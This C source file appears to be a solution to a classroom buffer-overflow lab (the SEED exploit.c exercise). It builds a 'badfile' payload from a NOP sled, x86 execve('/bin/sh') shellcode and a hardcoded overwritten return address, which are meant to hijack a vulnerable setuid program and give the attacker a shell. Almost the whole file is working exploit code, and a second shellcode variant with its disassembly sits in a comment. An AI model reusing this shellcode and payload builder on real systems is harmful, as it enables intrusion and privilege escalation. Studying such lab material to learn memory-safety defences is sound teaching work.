/* exploit.c */

/* a program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

//=============================================================================
// The shellcode is to abtain a shell (/bin/sh) in the target process space.
// You can test it by ((void (*)())shellcode)().
//=============================================================================
/*
char shellcode[]=
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
 80481e0:       31 d2                   xor    %edx,%edx
 80481e2:       52                      push   %edx
 80481e3:       68 6e 2f 73 68          push   $0x68732f6e
 80481e8:       68 2f 2f 62 69          push   $0x69622f2f
 80481ed:       89 e3                   mov    %esp,%ebx
 80481ef:       52                      push   %edx
 80481f0:       53                      push   %ebx
 80481f1:       89 e1                   mov    %esp,%ecx
 80481f3:       8d 42 0b                lea    0xb(%edx),%eax
 //8048419:		0f 34                	sysenter 
 80481f6:       cd 80                   int    $0x80
*/

/* seed exploit.c shellcode */

char shellcode[] =
    "\x31\xc0"                  /* xor      %eax, %eax      */
    "\x50"                      /* pushl    %eax            */
    "\x68""//sh"                /* pushl    $0x68732f2f     */
    "\x68""/bin"                /* pushl    $0x6e69622f     */
    "\x89\xe3"                  /* movl     %esp, %ebx      */
    "\x50"                      /* pushl    %eax            */
    "\x53"                      /* pushl    %ebx            */
    "\x89\xe1"                  /* movl     %esp, %ecx      */
    "\x99"                      /* cltd                     */
    "\xb0\x0b"                  /* movb     0x0b, %al       */
    "\xcd\x80"                  /* int      $0x80           */
;

#define BUF_LEN 256
#define TARGET_LEN  128

#define TARGET_ADDR 0xbffff0f4
#define OFFSET  (0x18)

int main(int argc, char **argv)
{
    /* TODO */
    int i;
    char buffer[BUF_LEN];
    FILE *badfile;
    unsigned long *ps, shcode_start;

    /* shellcode test

    ((void (*)())shellcode)();

    */
    /* initialize buffer with 0x90(NOP instruction) */
    memset(buffer, 0x90, BUF_LEN);

    /* you need to fill the buffer with appropriate contents here */
    /* save the contents to the file "badfile" */

    /****************** build shellcode **************************/
    /*  [ NOP NOP ... NOP shellcode address address ... address ]*/
    strcpy((buffer + TARGET_LEN - strlen(shellcode) - 1), shellcode);
    memset(buffer+strlen(buffer), 0x90, 1);

    ps = (unsigned long *)(buffer + OFFSET);

    (*ps) = (unsigned long)(TARGET_ADDR + 0x70);

    buffer[BUF_LEN - 1] = '\0';

    badfile = fopen("./badfile", "w");
    if(badfile == NULL){
        fprintf(stderr, "file open error!");
        exit(EXIT_FAILURE);
    }
    fwrite(buffer, BUF_LEN, 1, badfile);
    fclose(badfile);

    return 0;
}

